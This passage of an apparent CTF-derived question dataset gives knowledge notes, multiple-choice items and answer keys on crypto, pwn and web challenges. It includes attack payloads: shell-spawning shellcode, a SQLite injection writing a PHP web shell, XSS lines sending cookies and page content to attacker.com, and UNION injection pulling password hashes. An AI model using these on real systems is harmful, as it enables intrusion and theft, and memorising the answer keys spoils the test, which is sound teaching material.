            "In a challenge involving encryption with a key generated using a random seed, if you can influence or know the seed value, you can replicate the key generation process to decrypt the message. By manipulating input (such as `x` in polynomial calculations) to force the output to reveal information about the seed (or any critical value used in the key generation), the original key can be reconstructed, allowing for decryption of the encrypted content. For instance, by setting `x` to a power of 10 that is significantly larger than the bit length of the seed, the last digits of the resulting sum can expose the seed value when the polynomial sum is structured to leak information about its terms through its magnitude. This method demonstrates a classic example of exploiting weak cryptographic practices in applications.\n\nExample manipulation to expose seed value: Use `x = 10^n` where `n > [bit length of the seed]`.",
            "When dealing with obfuscated or encrypted data where the encryption method involves XOR with a pseudorandom stream generated from a seed, retrieving the seed allows for the exact replication of the pseudorandom stream and hence decryption. This approach exploits flaws in the security of pseudorandom number generators (PRNGs) when initial states (seeds) are not securely chosen or if they can be inferred from the system's outputs. Secure programming practices must avoid such leakage of critical information that could compromise the randomness and unpredictability of cryptographic keys.\n\nExample to decrypt once the seed is known:\n```python\nimport random  \nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\n\n# Assuming encrypted_flag and poly_0 values are known\nencrypted_flag = 'f79ace6c50045d9617387178738bc492c8a36bce6f62065ffd1712060127af'\npoly_0 = 5071636503793964919135745354381215807\n\nrandom.seed(poly_0)  \nkey = long_to_bytes(random.getrandbits(len(encrypted_flag)*4))  \n# XOR the key with the encrypted flag to decrypt\nflag = bxor(long_to_bytes(int(encrypted_flag, 16)), key)  \nprint(flag.decode())\n```\nThis exploit script demonstrates decrypting the flag using the derived seed for key generation."
        ],
        "question": [
            "When recovering a secret in a system where the first share of a polynomial is used as a seed for pseudorandom number generation, which method allows for the extraction of the seed if the output can be controlled by input `x`?  - A. Submitting `x` as a negative integer to invert the polynomial's sign and reveal the seed. - B. Choosing `x` as a small prime number to factor the polynomial's output and solve for the seed. - C. Setting `x` to a power of 10 significantly larger than the seed's bit length to make the seed apparent in the output's lower digits. - D. Using `x` values that correspond to the indices of the polynomial's coefficients to solve for the seed directly. ",
            "In the context of decrypting an encrypted message where the encryption key is generated from a known seed value, which Python code snippet correctly replicates the pseudorandom stream for decryption?  - A. ```python import random # Assuming incorrect approaches to generate the key encrypted_flag = 'example_encrypted_flag' seed = 12345 random.seed(seed) key = random.getrandbits(len(encrypted_flag)) # Incorrect bit length handling flag = encrypted_flag - key ```  - B. ```python # Incorrect library usage and decryption method import math seed = 12345 key = math.pow(seed, 2) # Misuse of seed for key generation encrypted_flag = 'example_encrypted_flag' flag = encrypted_flag ^ key ```  - C. ```python import random from Crypto.Util.number import long_to_bytes, bytes_to_long  encrypted_flag = 'f79ace6c50045d9617387178738bc492c8a36bce6f62065ffd1712060127af' poly_0 = 5071636503793964919135745354381215807  random.seed(poly_0) key = long_to_bytes(random.getrandbits(len(encrypted_flag)*4)) flag = bxor(long_to_bytes(int(encrypted_flag, 16)), key) print(flag.decode()) ```  - D. ```python # Simplified approach missing critical conversion steps import random seed = 'incorrect_seed_type' random.seed(seed) key = random.getrandbits(100) # Arbitrary bit size without relation to flag encrypted_flag = 'example_encrypted_flag' flag = encrypted_flag - key ``` "
        ],
        "answer": [
            "C. Setting `x` to a power of 10 significantly larger than the seed's bit length to make the seed apparent in the output's lower digits.",
            "C. Correctly demonstrates decrypting the flag using the derived seed for key generation, with appropriate handling of bit lengths and conversions between different data formats."
        ]
    },
    {
        "name": "Shannon Kent",
        "write_up": "dataset/raw/Shannon Kent.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When dealing with XOR operations in cryptographic CTF challenges, especially when a key length is explicitly mentioned, analyze the structure of the data that is known to be XORed with the key. For instance, if the flag format (`chctf{`) or any standard file header (like a gzip header) is known, these can be used to recover the XOR key. This approach applies when the XOR key length is equal to or shorter than the known plaintext length. Example payload (for recovering a 6 byte key with a known flag start `chctf{`): `xor_key = xor(known_plaintext_part, encrypted_part)`",
            "In challenges featuring multiple layers of encryption or encoding, reverse the process step by step starting from the outermost layer. This becomes feasible when the specifics of each step are known or can be inferred (e.g., ZIP compression followed by XOR encryption, then GZIP compression). Insight into the encryption or compression method\u2019s header format can significantly aid in deducing the keys or the approach to decryption without needing the keys themselves. This strategy is particularly useful when you're dealing with a stacked encryption or compression without direct access to encryption keys but knowing the algorithms and key lengths."
        ],
        "question": [
            "In a cryptographic CTF challenge, when attempting to recover a XOR key with known plaintext length, and you know the flag starts with `chctf{`, which of the following approaches is correct for recovering the 6-byte XOR key? - A. Use the known plaintext to generate a SHA-256 hash and compare it with the encrypted text. - B. Reverse engineer the binary to find the XOR key hidden in a separate function. - C. Apply the XOR operation between the known flag segment (`chctf{`) and the corresponding encrypted part to recover the XOR key. - D. Decrypt the message using RSA encryption with a public key provided in the challenge.",
            "In a CTF challenge that involves peeling back multiple layers of encryption or encoding, specifically ZIP compression after XOR encryption, followed by GZIP compression, which approach should be taken to decrypt the final layer if you know it starts with a GZIP header (10 bytes long)? - A. Decompress with ZIP using a generic password and then apply the known GZIP header to brute force the XOR key. - B. Directly inject a GZIP header into the outer ZIP layer to exploit a misconfiguration in the compression algorithm. - C. Start by reverse-engineering the ZIP file to find the embedded XOR key, then proceed to decrypt the GZIP layer. - D. Reverse the process step by step, using the knowledge of the GZIP header to recover the XOR key for the gzipped buffer, then decompress the ZIP file."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "shebang",
        "write_up": "dataset/raw/shebang.md",
        "type": "pwn",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": 99,
        "max_score": 500,
        "difficulty": 0.198,
        "knowledge": [
            "When faced with a CTF challenge involving executing commands or scripts within constrained environments, it's important to leverage the existing file descriptors (FDs). Specifically, if the environment restricts or filters direct command execution or file access, and you have predefined FDs pointing to essential resources (like a shell or a flag file), you can use redirection or calling mechanisms that utilize these FDs to bypass restrictions.Example payload: `ev/fd/3\\ncat <&9`",
            "In scenarios where code injection or command execution vulnerabilities exist, but are limited by character filters (e.g., disallowing `.`), utilizing system or device files present in directories like `/dev` can serve as an alternative means to execute commands or access functionalities indirectly. This approach is particularly useful when direct command execution paths are blocked, and specific FDs are known to be associated with required actions or data.Example payload: This particular point does not lend itself to a simple payload example as the approach depends highly on the specific system configuration and challenge setup."
        ],
        "question": [
            "When exploiting a file descriptor in a constrained environment to read a file, which command correctly leverages redirection to use an open file descriptor? - A. `cat <&3` - B. `ls >$9` - C. `echo >&5` - D. `cat <&9` ",
            "Given restrictions on direct file access and command execution, which directory is typically leveraged for indirectly executing commands or reading data through system or device files? - A. `/var/log` - B. `/dev` - C. `/home/user` - D. `/etc` "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Shebang0",
        "write_up": "dataset/raw/Shebang0.md",
        "type": "This write-up describes a forensics challenge as the participant needs to connect via SSH and retrieve the flag from a hidden file.",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 125,
        "max_score": 900,
        "difficulty": 0.1388888888888889,
        "knowledge": [
            "When initial commands do not return the expected results in a Linux environment CTF challenge, such as not showing any files with a simple `ls` command, trying more comprehensive commands like `ls -la` can reveal hidden files. This is because `ls -la` lists all files, including those starting with '.', which are hidden by default in Linux-based systems.",
            "Upon identifying a file with potentially valuable information, such as a hidden flag file in a CTF challenge, the `cat` command can be used to display its contents. This is a fundamental technique for accessing file data directly from the command line without needing to open it in a text editor. \n   - Example payload: `cat .flag.txt`"
        ],
        "question": [
            "In a Linux environment CTF challenge, when a participant discovers that the basic `ls` command does not reveal any files, which command should they try next to ensure all files, including hidden ones, are displayed? - A. Use `cd` to navigate through directories hoping to find files. - B. Employ `ls -la` to list all files, including hidden ones. - C. Execute `sudo reboot` to restart the system and try finding files again. - D. Apply `grep . *` in an attempt to search for files.",
            "When you find a hidden file that may contain valuable information in a CTF challenge, which command is appropriate to display its content directly from the terminal? - A. `touch .flag.txt` to modify the file's timestamp, confusing others about its last opened time. - B. `cp .flag.txt` to create a copy of the file for manipulation. - C. `rm .flag.txt` to remove the file and cover your tracks. - D. `cat .flag.txt` to display the contents of the file."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Shebang5",
        "write_up": "dataset/raw/Shebang5.md",
        "type": "The type of the challenge described in the write-up is a ***forensics*** challenge.",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 250,
        "max_score": 900,
        "difficulty": 0.2777777777777778,
        "knowledge": [
            "When investigating a system for potential exploitation points, binaries with the SUID bit set should be closely examined. These binaries execute with the permissions of the file's owner, not the user running the binary, which can potentially be abused to escalate privileges. To find such binaries, the `find` command can be utilized with filters to exclude non-relevant paths and to search for files with the SUID bit set. Example command: `find / -path /sys -prune -o -path /proc -prune -o -perm /4000`.",
            "Clues in challenge descriptions or hints can sometimes suggest the use of specific UNIX/Linux commands or permissions to uncover or leverage vulnerabilities. In scenarios where a hint suggests looking for abnormal file permissions or owner-specific files, commands such as `find / -user <username>` can be used to list all files owned by a particular user, which might unveil sensitive files or directories that could be used to obtain further access or information."
        ],
        "question": [
            "Given a scenario where an attacker needs to find binaries with escalated privileges on a Linux system, which command could be used to identify files with the SUID bit set while excluding the directories `/sys` and `/proc`? - A. `ls -laR | grep rws` - B. `find / -path /sys -prune -o -path /proc -prune -o -perm /4000` - C. `chmod +s / -R` - D. `grep -r SUID /` ",
            "When given a hint in a cybersecurity challenge indicating the investigation of files owned by a specific user, which command would effectively list all files owned by the user \"shebang6\" while excluding the directories `/sys` and `/proc`? - A. `find / -user shebang6` - B. `ls -l | grep shebang6` - C. `find / -path /sys -prune -o -path /proc -prune -o -user shebang6` - D. `chown -R shebang6 /` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Sheepish",
        "write_up": "dataset/raw/Sheepish.md",
        "type": "reverse",
        "competition": [
            "ImaginaryCTF/2023",
            "https://ctftime.org/event/2015/tasks/"
        ],
        "score": 433,
        "max_score": 490,
        "difficulty": 0.8836734693877552,
        "knowledge": [
            "When encountering obfuscated code in a CTF challenge that involves lambda functions, it helps to replace common lambda-calculus terms for known programming constructs with more readable variables and functions. This approach aids in deobfuscation by making the code more understandable. For example, replacing \\(\\lambda\\) terms that represent true, false, and basic arithmetic operations with their Python function equivalents can simplify the analysis and identification of the algorithm being implemented.",
            "In challenges involving complex obfuscated code, identifying and reimplementing the core logic or algorithm in a simpler, more understandable form can be crucial to solving the challenge. Once the main logic, such as arithmetic operations or data structure manipulations (like linked lists), is understood and reimplemented, it can be used to reverse-engineer the input (e.g., a flag) from the obfuscated script's output or behavior. Here is an example of implementing arithmetic operations in Python to decode obfuscated expressions:\n   ```python\n   def plus(x):\n       return lambda y: x + y\n\n   def mult(x):\n       return lambda y: x * y\n\n   def power(x):\n       return lambda y: x ** y\n\n   # Reimplementing these operations allows for decoding encoded messages or flags.\n   ```"
        ],
        "question": [
            "In the context of deobfuscating an obfuscated Python script that utilizes \u03bb-calculus for implementing boolean logic and arithmetic operations, which of the following correctly simulates the lambda term for the boolean value \"true\"? - A. `tru = lambda x, y: y` - B. `tru = lambda x: lambda y: x` - C. `tru = lambda x: lambda y: y` - D. `tru = lambda x, y: x` ",
            "When dealing with a challenge that involves decoding a flag from obfuscated expressions using basic arithmetic operations redefined with lambda functions, which of the following redefinitions correctly implements the 'power' operation in Python that can be used to decode the flag? - A. `power = lambda x: lambda y: x + y` - B. `power = lambda x: lambda y: x * y` - C. `power = lambda x: lambda y: x / y` - D. `power = lambda x: lambda y: x ** y` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "shell-_code",
        "write_up": "dataset/raw/shell-_code.md",
        "type": "pwn",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": -1.0,
        "max_score": 1285,
        "difficulty": -1,
        "knowledge": [
            "When facing stack overflow vulnerabilities where direct shellcode injection is limited by space, breaking the shellcode into multiple segments and utilizing jump instructions to connect these segments can be a viable strategy. This approach is particularly useful when the total amount of payload space is segmented across multiple inputs. The example demonstrates a scenario where shellcode is divided and then control flow is redirected to execute these segmented parts sequentially.",
            "In scenarios where a full `execve(\"/bin/sh\")` shellcode cannot be directly injected due to space constraints, one can place the command string (`\"/bin/sh\"`) right after the area controlled by a buffer overflow, and then use a short stub shellcode to move the stack pointer (`rsp`) to the register holding the first argument (`rdi`) for the `execve` syscall. This technique leverages the fact that `rsp` will point to the command string after the overflow and executes it via a syscall, effectively circumventing the space limitation for traditional shellcode. Example payload part:\n   \n   ```assembly\n   /* Short Stub Shellcode to Execute \"/bin/sh\" Located After Return Address */\n   mov rdi, rsp; /* Move rsp (which points to \"/bin/sh\") into rdi */\n   xor esi, esi; /* Second argument (argv) is set to 0 */\n   cdq; /* Clear EDX register for the third argument (envp), exploiting the fact that cdq sets rdx to 0 if eax is positive (which it is after xor) */\n   push 0x3b; /* Syscall number for execve in rax */\n   pop rax;\n   syscall; /* Invoke the kernel to execute execve(\"/bin/sh\", NULL, NULL) */\n   ```\n\n   This stub is strategically injected into the application's execution flow to ensure that the `execve` syscall is invoked with the intended command string as its argument, exploiting the buffer overflow vulnerability to gain shell access."
        ],
        "question": [
            "When dealing with a stack overflow vulnerability where space is limited, which technique can effectively execute a shellcode that exceeds the available buffer size by utilizing multiple inputs?  - A. Condensing the shellcode to fit within the initial buffer size without segmentation. - B. Breaking the shellcode into multiple segments and using jump instructions to connect these segments, allowing for sequential execution of separately injected code parts. - C. Increasing the buffer size at runtime using dynamic memory allocation techniques. - D. Encoding the shellcode to be smaller in size and then decoding it at runtime to fit within a single buffer. ",
            "In a situation where full `execve(\"/bin/sh\")` shellcode cannot fit due to buffer space limits, how can you execute the shellcode by placing \"/bin/sh\" after a buffer overflow area and utilizing a short stub shellcode?  - A. Use a complex encryption routine to hide the \"/bin/sh\" string within the available space and execute it directly. - B. Place the \"/bin/sh\" string in an environmental variable and reference it indirectly through the stub shellcode. - C. Utilize a stub shellcode to overwrite the stack pointer so it points directly to the \"/bin/sh\" string and execute it with an `execve` syscall. - D. Insert a NOP sled that leads execution flow directly to the \"/bin/sh\" string without the need for additional instructions. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Shellcode verifier",
        "write_up": "dataset/raw/Shellcode verifier.md",
        "type": "This write-up is related to a shellcode challenge, which falls under the category of a `pwn` (exploitation) challenge.",
        "competition": [
            "Dragon/2021",
            "https://ctftime.org/event/1457/tasks/"
        ],
        "score": 471,
        "max_score": 471,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a program that uses `mmap` for file-backed memory mapping, one can leverage the bug described in the `mmap` manual. This bug leads to modifications at the end of a memory-mapped file remaining in the page cache even after the file is unmapped and closed, and these modifications might be visible to subsequent mappings of the same file. This behavior can be exploited to bypass checks on the mapped content by ensuring only a portion of the file is verified while additional, unchecked instructions that have been written past the end of the object can still be executed. This is particularly useful in scenarios where an application verifies a portion of executable code before running it, as it allows an attacker to run unverified code.",
            "In scenarios requiring stealth or bypass of code verification mechanisms, it can be effective to initially write a minimal, non-malicious or less suspicious code segment to the file that will pass verification. Then, leveraging the aforementioned `mmap` bug, additional malicious code can be appended to the executable region in memory. This method ensures that only the initial, non-threatening segment is subjected to verification processes, while the additional code is executed without scrutiny. The process often involves the following steps: creating a file containing trivial or less suspicious code (e.g., a `nop` instruction), mapping this file into memory, appending the malicious code beyond this initial segment, and relying on the operational characteristics of `mmap` to execute the full code, including the appended malicious instructions, while bypassing verification of the added segment.\n\nExample payload steps based on the given strategy:",
            "Write initial innocuous instruction to file (e.g., `nop` - `0x90`).",
            "Use `mmap` to map this file into memory.",
            "Write the malicious payload (e.g., `execve(\"/bin/sh\", NULL, NULL)`) past the initial `nop` instruction in the memory-mapped area, exploiting the page cache behavior.",
            "Trigger execution of the memory-mapped area, ensuring both the initial `nop` instruction and the appended malicious payload are executed."
        ],
        "question": [
            "When exploiting the mmap bug for bypassing code verification in a security challenge scenario, which of the following best describes the reason this approach is effective? - A. Because the mmap function automatically corrects any corrupted file data before mapping it to memory. - B. Because modifications at the end of a memory-mapped file remain in the page cache even after the file is unmapped and closed, potentially being visible to subsequent mappings. - C. Because mmap exclusively works with non-executable files, ensuring higher security. - D. Because using mmap to map files into memory is inherently secure and undetectable by modern operating systems.",
            "In the context of executing an exploit that requires bypassing code verification mechanisms, which initial step is essential for leveraging the mmap bug effectively? - A. Immediately executing the malicious payload to take advantage of temporary file vulnerabilities. - B. Sending large amounts of data to overflow the page cache, allowing the execution of additional code. - C. Writing a minimal, non-malicious or less suspicious code segment to the file that will pass verification before appending the malicious code. - D. Encrypting the payload to avoid detection by the verification process."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Shelle",
        "write_up": "dataset/raw/Shelle.md",
        "type": "misc",
        "competition": [
            "HacktivityCon/2021",
            "https://ctftime.org/event/1444/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "In challenges involving restricted shell environments where direct execution of common commands (e.g., bash, sh) is blocked, using escape sequences or special characters might help bypass these restrictions. For example, discovering that certain characters like `$` or `-` are not blocked can lead to indirect command execution or reveal information about the environment. An effective strategy involves fuzzing to identify unblocked characters and leveraging shell features like environment variables (e.g., `$SHELL`) to gain a more permissive shell or execute commands indirectly. \n   - Example payload to gain shell access when `$SHELL` is not blocked: `$$SHELL`",
            "When faced with a restricted environment where direct information about the location of sensitive files (e.g., `flag.txt`) might not be readily available, utilizing system or process inspection commands that are not restricted (e.g., `ps`, `env`, `set`) can provide hints towards unusual paths or processes that could lead to discovering the flag. This approach relies on the observation of atypical entries in the output of such commands, suggesting where sensitive files or directories might be located.\n   - Example command to inspect potential locations for sensitive files: `ps`"
        ],
        "question": [
            "In a simulated restricted shell environment, when conventional commands to open a new shell are blocked, what could be an effective strategy to execute commands or bypass restrictions? - A. Using mathematical operations to calculate the path to the shell - B. Writing a custom script to brute force the shell\u2019s password - C. Utilizing environment variables with unblocked special characters like `$` - D. Attempting to physically reboot the server to bypass shell restrictions",
            "When direct methods to locate sensitive files are blocked in a restricted shell environment, which command could potentially help uncover unusual paths or processes that may lead to discovering the flag? - A. Using `ifconfig` to list all network interfaces - B. Employing `ps` to inspect current processes for unusual paths - C. Applying `chmod` to change permissions in the hope of revealing files - D. Utilizing `wget` to download potential flag files from the internet"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "ShellShellShell",
        "write_up": "dataset/raw/ShellShellShell.md",
        "type": "web",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 363,
        "max_score": 952,
        "difficulty": 0.38130252100840334,
        "knowledge": [
            "In challenges involving backup file disclosure vulnerabilities, it's effective to automatically download potentially exposed backup files such as `.swp` or `.bak` files for sensitive components like `index.php`, `config.php`, or other PHP files. This can be accomplished using scripting to automate the process of appending common backup file extensions to known file names and retrieving them from the server. Example snippet for automatically downloading backup files:\n    ```python\n    import os\n    # Example URL and file extensions to check\n    part_url = 'http://example.com/'\n    file_list = ['.index.php.swp', '.config.php.swp', '.user.php.swp']\n    for i in file_list:\n        os.system(f'curl {part_url + i} > downloaded/{i}')\n    ```",
            "When involved in exploiting SQL injection vulnerabilities that allow for the insertion of malicious SQL via web application functionalities (e.g., publishing features), specially crafted payloads can be utilized to bypass certain filtration methods such as `preg_replace`. This technique is notably effective when the application's logic improperly handles input during SQL command assembly, allowing the attacker to close the initial insertion context and append malicious SQL segments. In such scenarios, including backticks (`` ` ``) around payload components can escape the context and introduce arbitrary SQL execution. Example payload demonstrating this method:\n    ```sql\n    mood=0&signature=a`, `mood`); -- -\n    ```\n    This payload, when injected through a vulnerable insert function, may result in SQL query manipulation leading to unauthorized actions like database enumeration, data exfiltration, or authentication bypass."
        ],
        "question": [
            "In a cybersecurity challenge, a script is used to automatically download backup files from a web server. This is done by creating directories and using a curl command with a list of filenames combined with a base URL. Based on the provided script example, which directory structure is created before initiating downloads? - A. Two directories named \"source\" and \"source/views\" are created for storing downloaded backup files. - B. A single directory named \"backup_files\" is created for all files without differentiation. - C. Three directories named \"downloads\", \"configs\", and \"views\" are created based on file types. - D. No directories are created; files are downloaded into the current working directory. ",
            "When exploiting a SQL injection vulnerability in a web application feature that inappropriately filters input during SQL statement construction, attackers can utilize specially crafted payloads to manipulate the query. Given a scenario where the payload `mood=0&signature=a`, `mood`); -- -` is used to exploit such a vulnerability, what is the primary purpose of including backticks (`` ` ``) around payload components? - A. The backticks are used to escape the SQL context and introduce additional SQL commands by terminating the initial values list. - B. They serve to increase the payload's complexity and confuse basic input sanitation mechanisms. - C. Backticks are utilized to specify SQL keywords, ensuring they're interpreted correctly by the database engine. - D. The inclusion of backticks is intended to format the payload for better readability and debugging by the attacker. "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "shitty blog",
        "write_up": "dataset/raw/shitty blog.md",
        "type": "pwn",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 250,
        "max_score": 1000,
        "difficulty": 0.25,
        "knowledge": [
            "In a challenge where an application's logic relies on session management through HMAC verification, a flawed implementation in handling binary data can lead to HMAC forgery. Specifically, if a function like `crypt()` in PHP is used to hash the output of `hash_hmac()` and is not binary safe, it may terminate the processed string at a null byte (`\\x00`), causing an inconsistency in security checks. This can be exploited by generating payloads that cause the hash to start with a null byte, effectively bypassing the HMAC verification with a significantly higher chance (`1 / 256`) than brute-forcing the secret key.\n\nExample of Python code to exploit this:\n```python\ndef get_null_mac():\n    mac_counter = set()\n    for i in tqdm(itertools.count()):\n        res = requests.get(URL_BASE)\n        id, mac = urllib.parse.unquote(res.cookies[\"session\"]).split(\"|\")\n        if mac in mac_counter:\n            return mac\n        mac_counter.add(mac)",
            "For challenges involving SQL injection vulnerabilities specifically within SQLite databases, if the application allows dynamic creation of database objects (databases, tables), an attacker can perform SQL injection to achieve remote code execution (RCE) by attaching a new database and creating a `.php` file in a writable directory served by the webserver. This file can then be accessed directly via the webserver, executing any PHP code included within. It's crucial that the payload creates a file with a `.php` extension and includes PHP code that can be executed upon request.\n\nExample payload for SQL injection to RCE:\n```sql\n'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php system($_GET[\"cmd\"]); ?>'); --\n```"
        ],
        "question": [
            "In a cybersecurity challenge, when attempting to forge a HMAC in PHP due to an application's flawed handling of binary data with the `crypt()` function, what key property of the `crypt()` function allows the bypass of HMAC verification?  - A. `crypt()` function automatically salts the input, ensuring unique hashes. - B. `crypt()` function is fully binary safe and treats all inputs as ASCII strings. - C. `crypt()` function treats its input as null-terminated strings, which may ignore data after a null byte. - D. `crypt()` function outputs hashes in a binary format to improve security. ",
            "When exploiting a SQL injection in a challenge to achieve remote code execution (RCE) via SQLite, which statement best summarizes the method to create a `.php` file using SQL injection?  - A. Use the `CREATE USER` command to inject PHP code into the database's user table, automatically generating a `.php` file. - B. Utilize the `ATTACH DATABASE` command with a payload that attaches a new database and creates a `.php` file in a writable directory, inserting PHP code directly into it. - C. Perform a standard SQL injection to modify the webserver's configuration files, enabling PHP file creation upon a new database entry. - D. Inject PHP code directly into an existing database column, expecting the server to automatically execute said code based on MIME type. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Shop Manager",
        "write_up": "dataset/raw/Shop Manager.md",
        "type": "pwn",
        "competition": [
            "COMPFEST/2021",
            "https://ctftime.org/event/1358/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
            "When exploiting heap buffer overflow vulnerabilities, if additional space can be allocated beyond the intended size, this can facilitate arbitrary memory manipulations, such as expanding a chunk to overlap with adjacent chunks. This was demonstrated by editing the size of a heap chunk to a larger size to manipulate adjacent heap metadata.\n   - Example manipulation: Editing an item's name with \"a\"*0x28+p64(0x431) to change the adjacent chunk size.",
            "Leverage the manipulation of heap metadata and unsorted bin chunks for leaking libc addresses and performing tcache poisoning. By carefully managing heap operations (add, delete, edit), it's possible to place libc addresses into application-controlled heap chunks and subsequently adjust the free list (tcache) to point to arbitrary addresses (e.g., `__free_hook`). This allows injection of malicious addresses into the application's execution flow.\n   - Example for leaking libc address: After resizing and freeing a chunk to create an unsorted bin, add a new item to place the unsorted bin's libc address into a controllable heap area, then list items to leak the address.\n   - Example for tcache poisoning: Add a new item, delete two items to adjust the free list, then edit an item to overwrite a freed chunk's forward pointer with the address of `__free_hook`. This manipulation directs subsequent malloc calls to return a pointer to `__free_hook`, allowing overwriting it with the address of `system`."
        ],
        "question": [
            "In an exploitation scenario where a program takes item names through a function that does not limit input size, leading to heap buffer overflow, how can an oversized payload, such as \"a\"*0x28+p64(0x431), be used effectively? - A. To crash the program due to excessive memory allocation. - B. To perform a denial of service attack by consuming all available heap memory. - C. To manipulate heap metadata, such as chunk sizes, facilitating adjacent memory chunk manipulation. - D. To encrypt heap data, enhancing data security in the application process. ",
            "When performing a heap exploitation attack that involves leaking libc addresses and manipulating tcache, what is the main goal of using a carefully crafted sequence of heap operations (add, delete, edit) to manipulate a freed chunk\u2019s forward pointer to point to `__free_hook`? - A. To facilitate code reuse attacks by pointing malloc to return predictable addresses. - B. To increase the heap's efficiency by customizing the allocator\u2019s behavior. - C. To crash the allocator by causing it to allocate overlapping chunks. - D. To control the execution flow by overwriting `__free_hook` with the address of `system`, allowing arbitrary code execution. "
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Shop Quest",
        "write_up": "dataset/raw/Shop Quest.md",
        "type": "web",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing potential XSS vulnerabilities, particularly in web applications using frameworks like Vue.js, it is possible to craft payloads that execute arbitrary JavaScript in the context of another user's session (e.g., the operator's session in a chat application). This can be leveraged to exfiltrate sensitive information, such as document contents or cookies, to an attacker-controlled server. The exploitation can be enhanced in scenarios where the payload can trigger an action from the victim's browser, such as sending a request with the victim's session cookies or document data encoded in Base64.\n   - Example payload for exfiltrating the session cookie: `${toString.constructor('document.location = \"http://attacker.com/?\"+document.cookie')()}`",
            "In the presence of SQL injection vulnerabilities, especially where input is directly incorporated into database queries, it's imperative to test for different types of comment syntax to bypass potential filters or restrictions. This involves experimenting with various commenting techniques (`--`, `#`, `/* */`, etc.) to identify which ones effectively nullify the rest of the query, allowing for successful exploitation. Once a vulnerability is identified, it's possible to use UNION-based SQL injection to extract sensitive information from other tables in the database, such as user credentials or administrative hashes. This technique is particularly useful in scenarios where error messages or the application's responses reveal the structure or contents of the database.\n   - Sample UNION-based SQL Injection payload: `/Chat/getMessages?chatId=1`+union+select+login,hash,role,4+from+users+where+role=3--+-`"
        ],
        "question": [
            "In a web application leveraging the Vue.js framework, an attacker discovers an injection point within the customer name field. Which of the following payloads would effectively exploit a Cross-Site Scripting (XSS) vulnerability to exfiltrate the operator's document body contents to an attacker-controlled server?  - A. `<script>location.href='http://attacker.com/?cookie='+document.cookie;</script>` - B. `${toString.constructor('document.location = \"http://attacker.com/?\"+document.cookie')()}` - C. `<img src=x onerror=alert(document.cookie)>` - D. `${toString.constructor('var http=new XMLHttpRequest();http.open(\"POST\",\"http://attacker.com/?bot\",true);http.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");http.send(\"res=\"+btoa(unescape(encodeURIComponent(document.body.innerHTML))));')()}` ",
            "When attempting to identify a SQL injection vulnerability, a tester finds that some requests to the server's chat message retrieval endpoint respond differently to various commenting out techniques. Which of the following payloads would indicate the presence of a SQL injection vulnerability through the use of comments to manipulate the query?  - A. `/Chat/getMessages?chatId=1' OR '1'='1'` - B. `/Chat/getMessages?chatId=1'+UNION+SELECT+1,username,password+FROM+users--+-` - C. `/Chat/getMessages?chatId=1`+union+select+login,hash,role,4+from+users+where+role=3--+-` - D. `/Chat/getMessages?chatId=1 AND 1=2 UNION SELECT ALL null,null,null--` "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Shop V",
        "write_up": "dataset/raw/Shop V.2.md",
        "type": "This write-up describes a Capture The Flag (CTF) challenge related to exploiting a vulnerability in a shopping application built with Spring Boot in Java. Based on the provided description and solution, this challenge falls under the **web** category.",
        "competition": [
            "VolgaCTF/2019/Quals",
            "https://ctftime.org/event/713/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When exploiting mass assignment vulnerabilities in applications using the Spring Boot framework, especially when `ModelAttribute` is used, it's critical to understand the correct property names expected by the backend. If the application uses complex types like lists or objects, one must correctly structure the payload to match the expected format (`propertyName[index].attribute`) and account for any custom setter method names that don't directly map to the property name. If direct URL manipulation doesn't encode parameters properly, crafting a custom HTML form with the correct input names (`cartItems[0].id` vs. `cart[0].id`) is a viable workaround.\n   - Example HTML form element for payload: `<input type=\"hidden\" name=\"cartItems[0].id\" value=\"4\" />`",
            "The existence of a `robots.txt` file can reveal sensitive information or the locations of resources not intended to be found easily. In the context of CTF challenges or penetration testing, always check the `robots.txt` as it may contain paths to files or directories with source code, configuration files, or other interesting endpoints that could lead to vulnerabilities such as outdated versions or disabled features revealing implementation details."
        ],
        "question": [
